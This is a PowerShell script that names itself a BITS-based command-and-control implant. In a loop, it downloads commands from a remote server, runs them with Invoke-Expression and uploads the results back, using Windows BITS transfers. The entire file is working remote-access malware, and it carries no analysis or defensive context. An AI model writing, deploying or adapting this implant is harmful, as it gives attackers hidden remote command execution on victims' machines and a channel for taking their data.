$C2Server = "http://192.168.12.128"
$CommandFile = "/commands/command.json"
$UploadFile = "/uploads/response.txt"
$LocalCommandFile = "C:\Users\smail\Desktop\command.json"
$LocalResultFile = "C:\Users\smail\Desktop\response.txt"

function Download-Command {
    Write-Output "[*] Downloading command file from $C2Server$CommandFile"
    try {
        Start-BitsTransfer -Source "$C2Server$CommandFile" -Destination $LocalCommandFile -ErrorAction Stop
        Write-Output "[+] Command file downloaded successfully."
    } catch {
        Write-Output "[-] Failed to download command file: $_"
    }
}

function Execute-Command {
    if (Test-Path $LocalCommandFile) {
        $CommandData = Get-Content $LocalCommandFile | ConvertFrom-Json
        Write-Output "[*] Executing command: $($CommandData.command)"
        try {
            $ExecutionResult = Invoke-Expression $CommandData.command 2>&1
            Write-Output "[+] Command executed successfully."
            # Save output to a local file
            $ExecutionResult | Out-File -FilePath $LocalResultFile -Encoding utf8
        } catch {
            Write-Output "[-] Error during command execution: $_"
            "Error: $_" | Out-File -FilePath $LocalResultFile -Encoding utf8
        }
    } else {
        Write-Output "[-] Command file not found."
    }
}

function Upload-Result {
    if (Test-Path $LocalResultFile) {
        Write-Output "[*] Uploading result to $C2Server$UploadFile"
        try {
            Start-BitsTransfer -Source $LocalResultFile -Destination "$C2Server$UploadFile" -TransferType UploadReply -ErrorAction Stop
            Write-Output "[+] Result uploaded successfully."
            Remove-Item -Path $LocalResultFile -Force
        } catch {
            Write-Output "[-] Failed to upload result: $_"
        }
    } else {
        Write-Output "[-] No result file to upload."
    }
}

function Main-Loop {
    while ($true) {
        Write-Output "[*] Starting new iteration..."
        Download-Command
        Execute-Command
        Upload-Result
        del $LocalCommandFile
        del $LocalResultFile
        Start-Sleep -Seconds 30  # Wait 60 seconds before the next iteration
    }
}

# Start the implant
Write-Output "[*] Starting BITS-based C2 implant..."
Main-Loop
